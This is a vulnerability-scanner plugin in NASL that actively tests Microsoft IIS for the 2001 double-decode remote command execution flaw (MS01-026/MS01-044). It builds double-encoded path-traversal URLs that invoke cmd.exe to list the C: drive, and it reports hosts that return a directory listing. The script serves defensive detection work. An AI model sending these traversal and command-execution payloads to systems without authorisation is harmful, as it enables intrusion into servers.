# SPDX-FileCopyrightText: 2001 Matt Moore / HD Moore
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10671");
  script_version("2023-10-10T05:05:41+0000");
  script_tag(name:"last_modification", value:"2023-10-10 05:05:41 +0000 (Tue, 10 Oct 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"IAVA", value:"2001-a-0006");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2001-0507", "CVE-2001-0333");
  script_name("Microsoft IIS Remote Command Execution (MS01-026/MS01-044) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2001 Matt Moore / HD Moore");
  script_family("Web Servers");
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("microsoft/iis/http/detected");

  script_xref(name:"URL", value:"https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-044");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2708");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3193");

  script_tag(name:"solution", value:"See MS advisory MS01-026 (Superseded by MS01-044).");

  script_tag(name:"summary", value:"When IIS receives a user request to run a script, it renders
  the request in a decoded canonical form, then performs security checks on the decoded request.");

  script_tag(name:"insight", value:"A vulnerability results because a second, superfluous decoding pass is
  performed after the initial security checks are completed. Thus, a specially crafted request could allow
  an attacker to execute arbitrary commands on the IIS Server.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

dir[0] = "/scripts/";
dir[1] = "/msadc/";
dir[2] = "/iisadmpwd/";
dir[3] = "/_vti_bin/";          # FP
dir[4] = "/_mem_bin/";          # FP
dir[5] = "/exchange/";          # OWA
dir[6] = "/pbserver/";          # Win2K
dir[7] = "/rpc/";               # Win2K
dir[8] = "/cgi-bin/";
dir[9] = "/";

uni[0] = "%255c";       dots[0] = "..";
uni[1] = "%%35c";       dots[1] = "..";
uni[2] = "%%35%63";     dots[2] = "..";
uni[3] = "%25%35%63";   dots[3] = "..";
uni[4] = "%252e";       dots[4] = "/.";

function check(url) {
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if(!res)
    return(0);

  pat = "<DIR>";
  pat2 = "Directory of C";

  if((pat >< res) || (pat2 >< res)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    return(1);
  }
  return(0);
}

cmd = "/winnt/system32/cmd.exe?/c+dir+c:\\+/OG";
for(d = 0; dir[d]; d++) {
  for(i = 0; uni[i]; i++) {
    url = string(dir[d], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], cmd);
    if(check(url:url))
      exit(0);
  }
}

# Slight variation- do the same, but don't put dots[i] in front of cmd (reported on vuln-dev)
for(d = 0; dir[d]; d++) {
  for(i = 0; uni[i]; i++) {
    url = string(dir[d], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], cmd);
    if(check(url:url))
      exit(0);
  }
}

exit(99);
